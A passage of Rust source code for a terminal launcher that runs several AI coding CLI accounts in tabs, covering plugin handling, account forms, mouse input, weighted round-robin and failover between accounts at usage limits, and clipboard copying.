    /// Runs a plugin add or update on a thread (git may take a while); `job`'s line goes to
    /// the flash bar, then plugins reload.
    fn in_background(&self, job: impl FnOnce() -> String + Send + 'static) {
        let tx = self.plugin_tx.clone();
        std::thread::spawn(move || {
            let _ = tx.send(PluginMsg::Changed(job()));
        });
    }

    fn toggle_plugin(&mut self, name: &str) {
        let Some(on) = self.plugin(name).map(|s| s.plugin.on) else {
            return;
        };
        match plugins::set_on(&self.paths, name, !on) {
            Ok(()) => self.say(format!("{name} {}", if on { "off" } else { "on" })),
            Err(e) => self.say(format!("Could not change {name}: {e}")),
        }
        self.refresh();
        self.reload_plugins();
    }

    fn plugin_actions(&mut self, name: &str) {
        let Some(s) = self.plugin(name) else { return };
        if !s.plugin.on {
            return self.say(format!("{name} is off: press o to turn it on."));
        }
        if s.actions.is_empty() {
            return self.say(format!("{name} has no actions."));
        }
        let labels = s.actions.iter().map(|(_, l)| l.clone()).collect();
        self.modal = Some(Modal::Form(Form::actions(name, labels)));
    }

    /// Runs `plugin do <action>` on a thread; its last output line goes to the flash bar, and
    /// the plugin's rows reload after it.
    fn run_do(&mut self, name: &str, action: &str) {
        let tx = self.plugin_tx.clone();
        let Some(s) = self.plugin(name) else { return };
        if s.doing {
            return self.say(format!("{name} is busy."));
        }
        s.doing = true;
        let (name, dir, action) = (name.to_string(), s.plugin.dir.clone(), action.to_string());
        self.say(format!("{name}: {action}…"));
        std::thread::spawn(move || {
            let line = match plugins::run(&dir, &["do", &action], plugins::DO_TIMEOUT) {
                Ok(out) => plugins::last_line(&out).unwrap_or_else(|| format!("{action}: done")),
                Err(e) => format!("{action} failed: {e}"),
            };
            let _ = tx.send(PluginMsg::Done(name, line));
        });
    }

    /// Turns one account on or off for failover. Off accounts stay in the list but are skipped.
    fn toggle_member(&mut self, id: &str) {
        let mut o = self.order();
        if let Some(m) = o.iter_mut().find(|(m, _)| m == id) {
            m.1 = !m.1;
            let state = if m.1 {
                "on"
            } else {
                "off: skipped by failover"
            };
            config::save_order(&self.paths, &o);
            self.say(format!("{id} {state}"));
        }
        self.refresh();
    }

    fn toggle_mode(&mut self) {
        config::set_wrr(&self.paths, !self.wrr);
        self.say(if self.wrr {
            "Mode: failover."
        } else {
            "Round-robin: n or › Auto opens next."
        });
    }

    fn toggle_auto_switch(&mut self) {
        config::set_auto_switch(&self.paths, !self.auto_switch);
        // turned off: a running countdown stops and waits for `y`. Turned on: a waiting y/N stays as is.
        if self.auto_switch {
            for t in &mut self.tabs {
                if let Some(Notice::Switch { at, .. }) = &mut t.notice {
                    *at = None;
                }
            }
        }
        self.say(if self.auto_switch {
            "At a limit: ask before moving."
        } else {
            "At a limit: move by itself, Codex too."
        });
    }

    fn add_weight(&mut self, by: i64) {
        let Some(r) = self
            .rows
            .get(self.selected)
            .filter(|r| r.priority.is_some())
        else {
            return;
        };
        let (id, w) = (
            r.entry.id.clone(),
            (r.weight as i64 + by).clamp(0, 99) as u32,
        );
        config::save_weight(&self.paths, &id, w);
        self.say(format!("{id} weight {w}"));
    }

    /// Whether a CLI tab fills the screen (otherwise home does).
    pub fn in_tab(&self) -> bool {
        self.focus == Focus::Pane && self.current < self.tabs.len()
    }

    /// Where tab `t` would fail over to next: `failover::pick` over the rows, which are the
    /// order file and limit marks as of the last refresh (no file reads: this runs every frame).
    pub fn next_target(&self, t: usize) -> Option<&str> {
        let members = self
            .rows
            .iter()
            .filter(|r| r.priority.is_some())
            .map(|r| (r.entry.id.as_str(), r.on, r.limited.is_some()));
        failover::pick(members, &self.tabs.get(t)?.tried)
    }

    fn show_tab(&mut self, n: usize) {
        if n < self.tabs.len() {
            self.current = n;
            self.focus = Focus::Pane;
        }
    }

    pub fn say(&mut self, text: impl Into<String>) {
        self.flash = Some((text.into(), Instant::now() + Duration::from_secs(4)));
    }

    // ── add / edit / delete ───────────────────────────────

    /// A plugin's row: its `e` / `d` (a hint, or delete the whole plugin), never the providers file.
    fn plugin_row_key(&mut self, code: KeyCode) -> bool {
        let Some(name) = self
            .rows
            .get(self.selected)
            .and_then(|r| plugins::split_id(&r.entry.id))
            .map(|(n, _)| n.to_string())
        else {
            return false;
        };
        self.plugin_key(&name, true, code);
        true
    }

    fn start_edit(&mut self) {
        if self.plugin_row_key(KeyCode::Char('e')) {
            return;
        }
        let Some(r) = self.rows.get(self.selected) else {
            return;
        };
        let e = &r.entry;
        let form = if e.id.starts_with("claude/") {
            let label = config::providers(&self.paths)
                .into_iter()
                .find(|p| p.name == "claude")
                .map(|p| p.label);
            Form::edit(
                "claude",
                &label.unwrap_or_else(|| "Claude Code".into()),
                &e.command,
                true,
            )
        } else {
            Form::edit(&e.id, &e.label, &e.command, false)
        };
        self.modal = Some(Modal::Form(form));
    }

    fn start_delete(&mut self) {
        if self.plugin_row_key(KeyCode::Char('d')) {
            return;
        }
        let Some(r) = self.rows.get(self.selected) else {
            return;
        };
        let what = match r.entry.id.strip_prefix("claude/") {
            Some(acct) => format!(
                "It is logged out and {}/{acct} is deleted for good: its login, history and settings. Its open tabs close.",
                self.paths.cla_root.display()
            ),
            None => "It leaves the list, and its own Codex or Gemini login folder (if any) is deleted for good. Its open tabs close.".into(),
        };
        self.modal = Some(Modal::Confirm(Confirm {
            id: r.entry.id.clone(),
            what,
        }));
    }

    fn modal_key(&mut self, key: KeyEvent) {
        match self.modal.take() {
            Some(Modal::Confirm(c)) => match key.code {
                KeyCode::Char('y' | 'Y') => self.delete(&c.id),
                KeyCode::Char('n' | 'N') | KeyCode::Esc => {}
                _ => self.modal = Some(Modal::Confirm(c)),
            },
            Some(Modal::Form(mut f)) => match f.key(key) {
                Outcome::Open => self.modal = Some(Modal::Form(f)),
                Outcome::Cancel => {}
                Outcome::Save => {
                    if let Err(e) = self.save_form(&f) {
                        f.error = Some(e);
                        self.modal = Some(Modal::Form(f));
                    }
                }
            },
            None => {}
        }
        self.refresh();
    }

    fn save_form(&mut self, f: &Form) -> Result<(), String> {
        let (label, command) = (f.get("Label"), f.get("Command"));
        match &f.purpose {
            Purpose::AddPlugin => self.install(plugins::expand_home(&f.get("Source"))),
            Purpose::Action(name) => {
                let action = self
                    .plugins
                    .iter()
                    .find(|s| &s.plugin.name == name)
                    .and_then(|s| s.actions.get(f.index("Action")))
                    .map(|(a, _)| a.clone());
                if let Some(a) = action {
                    self.run_do(&name.clone(), &a);
                }
            }
            Purpose::Model => {
                let model = f.get("Model");
                if !config::valid_model(&model) {
                    return Err("A model is one word and doesn't start with -.".into());
                }
                config::set_model(&self.paths, &model);
                self.say(if model.is_empty() {
                    "Auto uses plain round-robin.".to_string()
                } else {
                    format!("Auto asks {model} which account to use.")
                });
            }
            Purpose::Edit(id) => {
                if plugins::split_id(id).is_some() {
                    return Err("A plugin is edited in its own folder.".into());
                }
                if command.is_empty() {
                    return Err("The command can't be empty.".into());
                }
                config::put_provider(&self.paths, id, Some((&command, &label)))
                    .map_err(|e| e.to_string())?;
                self.say(format!("Saved {id}."));
            }
            Purpose::Add => {
                let name = f.get("Name");
                if !config::valid_name(&name) {
                    return Err("Name: one word of letters, digits, . _ or -".into());
                }
                if f.get("Type") == "Claude account" {
                    if self.paths.cla_root.join(&name).exists() {
                        return Err(format!("A Claude account named {name} already exists."));
                    }
                    config::add_claude_account(&self.paths, &name).map_err(|e| e.to_string())?;
                    self.refresh();
                    self.open_login(&format!("claude/{name}"));
                    return Ok(());
                }
                if command.is_empty() {
                    return Err("The command can't be empty.".into());
                }
                if config::providers(&self.paths)
                    .iter()
                    .any(|p| p.name == name)
                    || name == "claude"
                {
                    return Err(format!("{name} is already in the list."));
                }
                config::put_provider(&self.paths, &name, Some((&command, &label)))
                    .map_err(|e| e.to_string())?;
                let own_login = config::add_login_dir(&self.paths, &name, &command).is_some();
                self.refresh();
                if own_login {
                    self.open_login(&name);
                } else {
                    self.say(format!("Added {name}. Press enter on it to start."));
                }
            }
        }
        Ok(())
    }

    fn delete(&mut self, id: &str) {
        if let Some((name, None)) = plugins::split_id(id) {
            let prefix = format!("{id}/");
            self.tabs.retain(|t| !t.member.starts_with(&prefix));
            self.current = self.current.min(self.tabs.len().saturating_sub(1));
            if self.tabs.is_empty() {
                self.focus = Focus::Home;
            }
            match plugins::rm(&self.paths, name) {
                Ok(()) => self.say(format!("Deleted plugin {name}.")),
                Err(e) => self.say(format!("Could not delete {name}: {e}")),
            }
            return self.refresh();
        }
        // a plugin entry is never a providers line
        if id.starts_with("plugin:") {
            return;
        }
        // its tabs close first (a stuck login is the usual one): dropping a pane ends its CLI
        self.tabs.retain(|t| t.member != id);
        self.current = self.current.min(self.tabs.len().saturating_sub(1));
        if self.tabs.is_empty() {
            self.focus = Focus::Home;
        }
        let mut logout_failed = false;
        let done = match id.strip_prefix("claude/") {
            Some(acct) => config::remove_claude_account(&self.paths, acct).map(|out| {
                if !out {
                    logout_failed = true;
                }
            }),
            None => {
                let command = self.entry(id).map(|e| e.command).unwrap_or_default();
                config::put_provider(&self.paths, id, None)
                    .and_then(|()| config::remove_login_dir(&self.paths, id, &command))
            }
        };
        match done {
            Ok(()) if logout_failed => self.say(format!(
                "Deleted {id}, but its logout failed: on macOS its Keychain login may remain."
            )),
            Ok(()) => self.say(format!("Deleted {id}.")),
            Err(e) => self.say(format!("Could not delete {id}: {e}")),
        }
        self.refresh();
    }

    /// A new account's first tab: its login (`claude auth login`, `codex login`).
    fn open_login(&mut self, id: &str) {
        let Some(entry) = self.entry(id) else { return };
        if let Some(i) = self.rows.iter().position(|r| r.entry.id == id) {
            self.selected = i;
        }
        let mut env: Vec<(String, Option<String>)> = Vec::new();
        let command = match entry.kind {
            Kind::Claude => {
                let dir = config::claude_dir(&self.paths, &entry, self.base_config.as_deref());
                env.push((
                    "CLAUDE_CONFIG_DIR".into(),
                    Some(dir.to_string_lossy().into_owned()),
                ));
                format!("{} auth login", entry.command)
            }
            Kind::Codex => {
                // the main login gets codex_home too: an inherited CODEX_HOME may be an account's
                let d = config::account_dir(&self.paths, &entry)
                    .unwrap_or_else(|| self.paths.codex_home.clone());
                env.push(("CODEX_HOME".into(), Some(d.to_string_lossy().into_owned())));
                format!("{} login", entry.command)
            }
            Kind::Other => {
                if config::agent(&entry.command) == "gemini"
                    && let Some(d) = config::account_dir(&self.paths, &entry)
                {
                    env.push((
                        "GEMINI_CLI_HOME".into(),
                        Some(d.to_string_lossy().into_owned()),
                    ));
                }
                entry.command.clone()
            }
            Kind::Plugin => return,
        };
        self.next_handoff += 1;
        self.tabs.push(Tab {
            member: id.to_string(),
            pane: None,
            notice: None,
            handoff: self.paths.fo_state.join(format!(
                "handoff.{}.{}.json",
                std::process::id(),
                self.next_handoff
            )),
            tried: vec![id.to_string()],
            split: Split::default(),
            session: None,
            done: false,
        });
        self.current = self.tabs.len() - 1;
        self.focus = Focus::Pane;
        let (rows, cols) = self.pane_size;
        match Pane::spawn(&command, &[], &env, rows, cols) {
            Ok(p) => self.tabs[self.current].pane = Some(p),
            Err(e) => {
                self.tabs[self.current].notice =
                    Some(Notice::Error(format!("could not start {command}: {e}")))
            }
        }
        self.say(format!(
            "Log in to {} in this tab (click a link to copy it). When it ends, press enter to start it.",
            self.label(id)
        ));
    }

    // ── mouse ─────────────────────────────────────────────

    pub fn on_mouse(&mut self, m: MouseEvent, hits: &Hits) {
        let at = Position::new(m.column, m.row);
        let inside = |r: &Rect| r.contains(at);
        if self.modal.is_some() {
            if let (MouseEventKind::Down(MouseButton::Left), Some(Modal::Form(f))) =
                (m.kind, &mut self.modal)
                && let Some((_, i)) = hits.fields.iter().find(|(r, _)| inside(r))
                && (*i == f.fields.len() || !f.fields[*i].locked)
            {
                f.focus = *i;
                if *i == f.fields.len() {
                    self.modal_key(KeyEvent::new(KeyCode::Enter, KeyModifiers::NONE));
                }
            }
            return;
        }
        if let Some(w) = &mut self.plugins_win {
            if m.kind != MouseEventKind::Down(MouseButton::Left) {
                return;
            }
            if hits
                .buttons
                .iter()
                .any(|(r, b)| *b == Button::Home && inside(r))
            {
                self.plugins_win = None;
                return;
            }
            // a click is never text for the form or the search
            if w.form.is_some() && w.review.is_none() {
                return;
            }
            w.searching = false;
            if let Some((_, i, code)) = hits.plugin_btns.iter().find(|(r, ..)| inside(r)) {
                w.sel = *i;
                self.plugins_win_key(KeyEvent::new(*code, KeyModifiers::NONE));
            } else if let Some((_, i)) = hits.plugin_rows.iter().find(|(r, _)| inside(r)) {
                w.sel = *i;
            }
            return;
        }
        if let MouseEventKind::Down(MouseButton::Left) = m.kind {
            if let Some((_, t)) = hits.closes.iter().find(|(r, _)| inside(r)) {
                self.current = *t;
                return self.close_tab();
            }
            if let Some((_, t)) = hits.tabs.iter().find(|(r, _)| inside(r)) {
                return self.show_tab(*t);
            }
            if let Some(name) = hits
                .plugins
                .iter()
                .find(|(r, _)| inside(r))
                .map(|(_, n)| n.clone())
            {
                return self.toggle_plugin(&name);
            }
            if let Some((_, b)) = hits.buttons.iter().find(|(r, _)| inside(r)) {
                match b {
                    Button::Add => self.modal = Some(Modal::Form(Form::add())),
                    Button::AddPlugin => self.open_plugins(true),
                    Button::Plugins => self.open_plugins(false),
                    Button::Edit => self.start_edit(),
                    Button::Delete => self.start_delete(),
                    Button::Failover => config::set_failover(&self.paths, !self.failover),
                    Button::Mode => self.toggle_mode(),
                    Button::AutoSwitch => self.toggle_auto_switch(),
                    Button::Auto => self.open_auto(),
                    Button::Home => self.focus = Focus::Home,
                }
                return self.refresh();
            }
            if let Some((_, i)) = hits.switches.iter().find(|(r, _)| inside(r)) {
                self.selected = *i;
                if let Some(id) = self.rows.get(*i).map(|r| r.entry.id.clone()) {
                    self.toggle_member(&id);
                }
                return;
            }
            if let Some((_, i)) = hits.rows.iter().find(|(r, _)| inside(r)) {
                // one click selects, a second on the same row within 500 ms opens it
                let again = self
                    .last_click
                    .is_some_and(|(r, t)| r == *i && t.elapsed() < Duration::from_millis(500));
                self.last_click = (!again).then(|| (*i, Instant::now()));
                self.selected = *i;
                self.focus = Focus::Home;
                if again && let Some(id) = self.rows.get(*i).map(|r| r.entry.id.clone()) {
                    self.open(&id);
                }
                return;
            }
        }
        let up = matches!(m.kind, MouseEventKind::Up(_));
        let follows =
            self.pane_drag && matches!(m.kind, MouseEventKind::Drag(_) | MouseEventKind::Up(_));
        if matches!(m.kind, MouseEventKind::Down(_)) && inside(&hits.pane) {
            self.pane_drag = true;
        }
        if up {
            self.pane_drag = false;
        }
        if (inside(&hits.pane) || follows)
            && let Some(tab) = self.tabs.get(self.current)
        {
            if matches!(m.kind, MouseEventKind::Down(_)) {
                self.focus = Focus::Pane;
            }
            if tab.notice.is_none()
                && let Some(p) = &tab.pane
            {
                let pane = hits.pane;
                // a login link wraps over rows and the mouse is ours, so the terminal can't select it: a click copies it
                if let MouseEventKind::Down(MouseButton::Left) = m.kind
                    && inside(&pane)
                    && let Some(link) = p.link_at(m.column - pane.x, m.row - pane.y)
                {
                    copy(&link);
                    // the field, not say(): `tab` still borrows self.tabs
                    self.flash = Some((
                        "Copied the link. Open it on any device, then paste the code here.".into(),
                        Instant::now() + Duration::from_secs(4),
                    ));
                }
                let col = m
                    .column
                    .clamp(pane.x, pane.right().saturating_sub(1).max(pane.x));
                let row = m
                    .row
                    .clamp(pane.y, pane.bottom().saturating_sub(1).max(pane.y));
                p.mouse(m.kind, col - pane.x, row - pane.y);
            }
        }
    }

    fn move_member(&mut self, by: isize) {
        let Some(id) = self.rows.get(self.selected).map(|r| r.entry.id.clone()) else {
            return;
        };
        let mut o = self.order();
        let Some(i) = o.iter().position(|(m, _)| *m == id) else {
            return;
        };
        let j = i as isize + by;
        if j < 0 || j as usize >= o.len() {
            return;
        }
        o.swap(i, j as usize);
        config::save_order(&self.paths, &o);
        self.refresh();
    }

    fn close_tab(&mut self) {
        if self.current < self.tabs.len() {
            self.tabs.remove(self.current);
            self.current = self.current.min(self.tabs.len().saturating_sub(1));
        }
        if self.tabs.is_empty() {
            self.focus = Focus::Home;
        }
    }

    // ── running CLIs ──────────────────────────────────────

    /// Members an Auto launch may pick, in priority order: on, weight above 0, not limited.
    fn auto_candidates(&self) -> Vec<(String, u32)> {
        self.rows
            .iter()
            .filter(|r| r.priority.is_some() && r.on && r.weight > 0 && r.limited.is_none())
            .map(|r| (r.entry.id.clone(), r.weight))
            .collect()
    }

    /// Opens the next account by weighted round-robin, or the one the routing model picks.
    pub fn open_auto(&mut self) {
        if !self.wrr {
            return self.say("Auto needs round-robin mode: press w.");
        }
        if self.deciding.is_some() {
            return;
        }
        let cands = self.auto_candidates();
        let Some((default, _)) = wrr::next(&cands, &wrr::load(&self.paths), None) else {
            return self.say("No account is on, weighted above 0 and free.");
        };
        let model = config::model(&self.paths);
        // the model runs on a Claude account that is free right now, the round-robin pick first
        let dir = std::iter::once(&default)
            .chain(cands.iter().map(|(m, _)| m))
            .filter_map(|m| self.entry(m))
            .find(|e| e.kind == Kind::Claude)
            .map(|e| config::claude_dir(&self.paths, &e, self.base_config.as_deref()));
        let (false, Some(dir)) = (model.is_empty(), dir) else {
            return self.auto_open(&cands, &default);
        };
        let info: Vec<(String, u32, String)> = cands
            .iter()
            .map(|(m, w)| {
                let usage = self
                    .rows
                    .iter()
                    .find(|r| &r.entry.id == m)
                    .map(|r| {
                        r.usage
                            .windows
                            .iter()
                            .map(|w| format!("{} {}%", w.label, w.percent))
                            .collect::<Vec<_>>()
                            .join(" ")
                    })
                    .filter(|u| !u.is_empty())
                    .unwrap_or_else(|| "unknown".into());
                (m.clone(), *w, usage)
            })
            .collect();
        self.say(format!("Asking {model} which account to use…"));
        self.deciding = Some(Deciding {
            rx: wrr::spawn_decide(
                model,
                dir.to_string_lossy().into_owned(),
                wrr::prompt(&info, &default),
            ),
            cands,
            default,
        });
    }

    fn auto_open(&mut self, cands: &[(String, u32)], pick: &str) {
        if let Some((_, s)) = wrr::next(cands, &wrr::load(&self.paths), Some(pick)) {
            wrr::save(&self.paths, &s);
        }
        self.open(pick);
        self.say(format!("Auto → {}", self.label(pick)));
    }

    /// Opens a new tab running the entry, with the args `ai-launcher` got the first time.
    pub fn open(&mut self, id: &str) {
        // the args ai-launcher got are claude args: only a Claude entry takes them
        let is_claude = self.entry(id).is_some_and(|e| e.kind == Kind::Claude);
        let args = if is_claude {
            self.first_args.take().unwrap_or_default()
        } else {
            Vec::new()
        };
        let flags = self
            .value_flags
            .get_or_insert_with(failover::value_flags)
            .clone();
        let split = failover::split_args(&args, &flags);
        self.next_handoff += 1;
        let handoff = self.paths.fo_state.join(format!(
            "handoff.{}.{}.json",
            std::process::id(),
            self.next_handoff
        ));
        self.tabs.push(Tab {
            member: id.to_string(),
            pane: None,
            notice: None,
            handoff,
            tried: vec![id.to_string()],
            split,
            session: None,
            done: false,
        });
        self.current = self.tabs.len() - 1;
        self.focus = Focus::Pane;
        self.launch(self.current, args);
    }

    fn launch(&mut self, t: usize, args: Vec<String>) {
        let id = self.tabs[t].member.clone();
        if id.starts_with("plugin:") {
            return self.launch_plugin(t, args);
        }
        let Some(entry) = self.entry(&id) else {
            self.tabs[t].notice = Some(Notice::Error(format!("{id} is no longer in the list")));
            return;
        };
        let failover = self.failover && entry.kind == Kind::Claude;
        let mut env: Vec<(String, Option<String>)> = Vec::new();
        let mut command = entry.command.clone();
        match entry.kind {
            Kind::Claude => {
                let cfg = if id.starts_with("claude/") {
                    Some(config::claude_dir(&self.paths, &entry, None))
                } else {
                    self.base_config.clone()
                };
                env.push((
                    "CLAUDE_CONFIG_DIR".into(),
                    cfg.map(|p| p.to_string_lossy().into_owned()),
                ));
                if failover {
                    let _ = std::fs::create_dir_all(&self.paths.fo_state);
                    let _ = std::fs::remove_file(&self.tabs[t].handoff);
                    command = format!(
                        "{command} --plugin-dir {}",
                        shell_quote(&self.mod_dir.to_string_lossy())
                    );
                    let next =
                        failover::next_member(&self.paths, &self.entries(), &self.tabs[t].tried);
                    env.push((
                        "AI_FO_HANDOFF".into(),
                        Some(self.tabs[t].handoff.to_string_lossy().into_owned()),
                    ));
                    env.push(("AI_FO_MEMBER".into(), Some(self.label(&id))));
                    env.push(("AI_FO_NEXT".into(), next.map(|n| self.label(&n))));
                }
            }
            Kind::Codex => {
                // the main login gets codex_home too: an inherited CODEX_HOME may be an account's
                let d = config::account_dir(&self.paths, &entry)
                    .unwrap_or_else(|| self.paths.codex_home.clone());
                env.push(("CODEX_HOME".into(), Some(d.to_string_lossy().into_owned())));
            }
            Kind::Other => {
                if config::agent(&entry.command) == "gemini"
                    && let Some(d) = config::account_dir(&self.paths, &entry)
                {
                    env.push((
                        "GEMINI_CLI_HOME".into(),
                        Some(d.to_string_lossy().into_owned()),
                    ));
                }
            }
            Kind::Plugin => {}
        }
        let (rows, cols) = self.pane_size;
        match Pane::spawn(&command, &args, &env, rows, cols) {
            Ok(p) => {
                self.tabs[t].pane = Some(p);
                self.tabs[t].notice = None;
                self.tabs[t].done = false;
            }
            Err(e) => {
                self.tabs[t].notice = Some(Notice::Error(format!("could not start {command}: {e}")))
            }
        }
    }

    /// A plugin tab: `<dir>/plugin launch <id>` in the PTY. Outside failover entirely: no
    /// account folder, no failover mod, no handoff.
    fn launch_plugin(&mut self, t: usize, args: Vec<String>) {
        let id = self.tabs[t].member.clone();
        let Some((p, eid)) = plugins::resolve(&self.paths, &id) else {
            self.tabs[t].notice =
                Some(Notice::Error(format!("{id} is off or no longer installed")));
            return;
        };
        let exe = shell_quote(&p.dir.join("plugin").to_string_lossy());
        // Windows has no exec bit: run it through Git Bash
        let run = if cfg!(windows) { "bash" } else { "exec" };
        let command = format!("{run} {exe} launch {}", shell_quote(&eid));
        let env = vec![(
            "AI_PLUGIN_DIR".to_string(),
            Some(p.dir.to_string_lossy().into_owned()),
        )];
        let (rows, cols) = self.pane_size;
        match Pane::spawn(&command, &args, &env, rows, cols) {
            Ok(pane) => {
                self.tabs[t].pane = Some(pane);
                self.tabs[t].notice = None;
                self.tabs[t].done = false;
            }
            Err(e) => {
                self.tabs[t].notice = Some(Notice::Error(format!("could not start {id}: {e}")))
            }
        }
    }

    /// Called every frame: notices CLIs that ended and runs due switches.
    pub fn tick(&mut self) {
        let mut changed = false;
        while let Ok(m) = self.plugin_rx.try_recv() {
            changed = true;
            match m {
                PluginMsg::Rows(name, rows) => {
                    if let Some(s) = self.plugin(&name) {
                        s.loading = false;
                        // a failure after good rows keeps them on screen
                        if rows.is_some() || !matches!(s.rows, Some(Some(_))) {
                            s.rows = Some(rows);
                        }
                    }
                }
                PluginMsg::Actions(name, actions) => {
                    if let Some(s) = self.plugin(&name) {
                        s.actions = actions;
                    }
                }
                PluginMsg::Done(name, line) => {
                    if let Some(s) = self.plugin(&name) {
                        s.doing = false;
                    }
                    self.say(format!("{name}: {line}"));
                    self.reload_plugins();
                }
                PluginMsg::Changed(line) => {
                    self.say(line);
                    // a new plugin needs its state before its rows can load
                    self.refresh();
                    self.reload_plugins();
                }
                PluginMsg::Installed(name, line) => {
                    self.busy.retain(|n| Some(n) != name.as_ref());
                    self.say(line);
                    self.refresh();
                    self.reload_plugins();
                }
                PluginMsg::Review(s) => self.open_review(SetupTarget::Install(s)),
            }
        }
        self.finish_setups();
        if changed {
            self.refresh();
        }
        if let Some(v) = self.update_rx.as_ref().and_then(|rx| rx.try_recv().ok()) {
            self.say(format!("Update v{v}: npm i -g ai-launcher"));
            self.update = Some(v);
            self.update_rx = None;
        }
        // the model's answer; a dead thread counts as no answer
        let reply = self.deciding.as_ref().and_then(|d| match d.rx.try_recv() {
            Ok(r) => Some(r),
            Err(std::sync::mpsc::TryRecvError::Empty) => None,
            Err(_) => Some(None),
        });
        if let Some(reply) = reply
            && let Some(d) = self.deciding.take()
        {
            let pick = wrr::choose(reply.as_deref(), &d.cands, &d.default);
            self.auto_open(&d.cands, &pick);
        }
        if self
            .flash
            .as_ref()
            .is_some_and(|(_, until)| Instant::now() > *until)
        {
            self.flash = None;
        }
        for t in 0..self.tabs.len() {
            if let Some(Notice::Switch { at, .. }) = &self.tabs[t].notice {
                if at.is_some_and(|at| Instant::now() >= at) {
                    self.switch_now(t);
                }
                continue;
            }
            if self.tabs[t].done {
                continue;
            }
            let Some(code) = self.tabs[t].pane.as_mut().and_then(Pane::exited) else {
                continue;
            };
            self.tabs[t].done = true;
            let handoff = failover::read_handoff(&self.tabs[t].handoff);
            let _ = std::fs::remove_file(&self.tabs[t].handoff);
            match handoff {
                Some(h) if self.failover => {
                    config::mark_limited(&self.paths, &self.tabs[t].member);
                    self.tabs[t].session = h.session_id.zip(h.transcript);
                    self.retry(t);
                    self.refresh();
                }
                _ => {
                    if self.tabs[t].notice.is_none() {
                        self.tabs[t].notice = Some(Notice::Ended { code });
                    }
                }
            }
        }
    }

    /// Picks the next member for a tab whose account hit its limit.
    fn retry(&mut self, t: usize) {
        let from = self.label(&self.tabs[t].member);
        let next = failover::next_member(&self.paths, &self.entries(), &self.tabs[t].tried);
        self.tabs[t].notice = Some(match next {
            Some(to) => {
                let codex = self.entry(&to).is_some_and(|e| e.kind == Kind::Codex);
                Notice::Switch {
                    at: config::auto_switch_on(&self.paths).then(|| Instant::now() + SWITCH_WAIT),
                    codex,
                    from,
                    to,
                }
            }
            None => Notice::NoneLeft { from },
        });
    }

    fn switch_now(&mut self, t: usize) {
        let Some(Notice::Switch { to: agreed, .. }) = &self.tabs[t].notice else {
            return;
        };
        let agreed = agreed.clone();
        self.tabs[t].notice = None;
        if !self.failover {
            self.tabs[t].notice = Some(Notice::Ended { code: 1 });
            return;
        }
        // the order, on/off and limits may have changed while the notice was up;
        // the yes was for `agreed` only, so a different next member asks again
        let Some(to) = failover::next_member(&self.paths, &self.entries(), &self.tabs[t].tried)
            .filter(|to| *to == agreed)
        else {
            return self.retry(t);
        };
        let Some(entry) = self.entry(&to) else {
            return self.retry(t);
        };
        let tab = &mut self.tabs[t];
        let args = match (entry.kind, &tab.session) {
            (Kind::Claude, Some((sid, transcript))) => {
                let dir = config::claude_dir(&self.paths, &entry, self.base_config.as_deref());
                if let Err(e) = failover::move_transcript(transcript, &dir) {
                    tab.notice = Some(Notice::Error(format!(
                        "could not move the session to {to}: {e}"
                    )));
                    return;
                }
                let mut a = tab.split.keep.clone();
                a.extend([
                    "--resume".to_string(),
                    sid.clone(),
                    failover::CONTINUE.to_string(),
                ]);
                a
            }
            (Kind::Codex, Some((_, transcript))) => vec![format!(
                "{} Below is the end of the Claude Code transcript (full file: {}).\n\n{}",
                failover::CONTINUE,
                transcript.display(),
                failover::handoff_text(transcript)
            )],
            // no transcript yet: start over with the prompt
            _ => tab.split.prompt.clone().into_iter().collect(),
        };
        tab.member = to.clone();
        tab.tried.push(to);
        self.launch(t, args);
    }

    pub fn resize(&mut self, rows: u16, cols: u16) {
        let (rows, cols) = (rows.max(1), cols.max(1));
        self.pane_size = (rows, cols);
        for t in &mut self.tabs {
            if let Some(p) = &mut t.pane {
                p.resize(rows, cols);
            }
        }
    }
}

/// A plugin's home rows: one per entry (`plugin:<name>/<id>`), or one state line
/// (`plugin:<name>`) when it is off, loading, failed or empty, so its section is always reachable.
fn plugin_rows(s: &PluginState) -> Vec<Row> {
    let name = &s.plugin.name;
    let row = |id: String, label: String, status: String, details: Vec<String>| Row {
        entry: Entry {
            id,
            kind: Kind::Plugin,
            label,
            command: String::new(),
        },
        priority: None,
        on: false,
        limited: None,
        usage: Usage::default(),
        weight: 1,
        status,
        details,
    };
    let state = |text: String| {
        vec![row(
            format!("plugin:{name}"),
            text,
            String::new(),
            Vec::new(),
        )]
    };
    match &s.rows {
        _ if !s.plugin.on => state(format!("{name} · off")),
        None => state("loading…".into()),
        Some(None) => state(format!("{name}: plugin failed")),
        Some(Some(r)) if r.entries.is_empty() => state("no entries".into()),
        Some(Some(r)) => r
            .entries
            .iter()
            .map(|e| {
                row(
                    format!("plugin:{name}/{}", e.id),
                    e.label.clone(),
                    e.status.clone(),
                    e.details.clone(),
                )
            })
            .collect(),
    }
}

fn shell_quote(s: &str) -> String {
    format!("'{}'", s.replace('\'', r"'\''"))
}

/// Puts text on the clipboard: OSC 52 for the terminal (works over ssh), plus the OS tool when
/// there is one, since some terminals (macOS Terminal) ignore OSC 52.
fn copy(text: &str) {
    use std::process::{Command, Stdio};
    let _ = crossterm::execute!(
        std::io::stdout(),
        crossterm::clipboard::CopyToClipboard::to_clipboard_from(text)
    );
    let tools: &[&[&str]] = &[
        &["pbcopy"],
        &["clip.exe"],
        &["wl-copy"],
        &["xclip", "-selection", "clipboard"],
    ];
    for t in tools {
        if let Ok(mut c) = Command::new(t[0])
            .args(&t[1..])
            .stdin(Stdio::piped())
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .spawn()
        {
            if let Some(mut i) = c.stdin.take() {
                let _ = std::io::Write::write_all(&mut i, text.as_bytes());
            }
            let _ = c.wait();
            return;
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use ratatui::layout::Rect;
    use std::fs;
    use std::sync::atomic::{AtomicUsize, Ordering};

    #[test]
    fn bash_path_uses_slashes_only_on_windows() {
        let want = if cfg!(windows) { "C:/a/b" } else { "C:\\a\\b" };
        assert_eq!(to_bash_path("C:\\a\\b"), want);
    }

    static N: AtomicUsize = AtomicUsize::new(0);

    /// An app over a fresh temp folder: claude account `w`, other CLIs `t1` and `t2` (command `true`).
    fn app() -> App {
        let home = std::env::temp_dir().join(format!(
            "ai-launcher-test-{}-{}",
            std::process::id(),
            N.fetch_add(1, Ordering::Relaxed)
        ));
        let _ = fs::remove_dir_all(&home);
        let cla_root = home.join("cla");
        fs::create_dir_all(cla_root.join("w")).unwrap();
        let providers = home.join("cfg/providers");
        fs::create_dir_all(providers.parent().unwrap()).unwrap();
        fs::write(
            &providers,
